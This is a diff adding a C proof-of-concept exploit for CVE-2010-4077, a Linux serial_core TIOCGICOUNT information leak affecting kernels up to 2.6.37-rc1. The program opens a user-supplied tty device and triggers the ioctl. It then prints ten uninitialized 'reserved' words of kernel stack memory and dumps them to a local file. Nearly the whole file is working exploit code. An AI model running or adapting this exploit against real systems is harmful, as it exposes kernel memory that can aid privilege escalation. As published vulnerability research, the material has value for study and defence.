@@ -1,0 +1,52 @@
+/* Linux <= 2.6.37-rc1 serial_core TIOCGICOUNT leak
+ * ================================================ 
+ * Information leak exploit for CVE-2010-4077 which
+ * leaks kernel stack space back to userland due to
+ * uninitialized struct member "reserved" in struct
+ * serial_icounter_struct copied to userland. uses 
+ * ioctl to trigger memory leak, dumps to file and 
+ * displays to command line.
+ *
+ * -- prdelka
+ *
+ */
+#include <termios.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <linux/serial.h>
+#include <stdio.h>
+#include <stdlib.h>	
+#include <string.h>
+
+int main(int argc, char* argv[]) {
+    int fd, ret = 0, i;
+    struct serial_icounter_struct buffer;
+    printf("[ Linux <= 2.6.37-rc1 serial_core TIOCGICOUNT leak exploit\n");
+    if(argc < 2){
+	printf("[ You need to supply a device name e.g. /dev/ttyS0\n");
+	exit(-1);
+    };
+    memset(&buffer,0,sizeof(buffer));
+    if((fd = open(argv[1], O_RDONLY)) == -1){
+	printf("[ Couldn't open %s\n",argv[1]);
+	exit(-1);
+    }
+    if((ioctl(fd, TIOCGICOUNT, &buffer)) == -1){
+	printf("[ Problem with ioctl() request\n");
+	exit(-1);
+    }
+    close(fd); 
+    for(i=0;i<=9;i++){
+            printf("[ int leak[%d]: %x\n",i,buffer.reserved[i]);
+    };
+    if((fd = open("./leak", O_RDWR | O_CREAT, 0640)) == -1){
+	printf("[ Can't open file to write memory out\n");
+	exit(-1);
+    }
+    for(i=0;i<=9;i++){
+	    ret += write(fd,&buffer.reserved[i],sizeof(int));
+    }
+    close(fd);
+    printf("[ Written %d leaked bytes to ./leak\n",ret);
+    exit(0);
+}
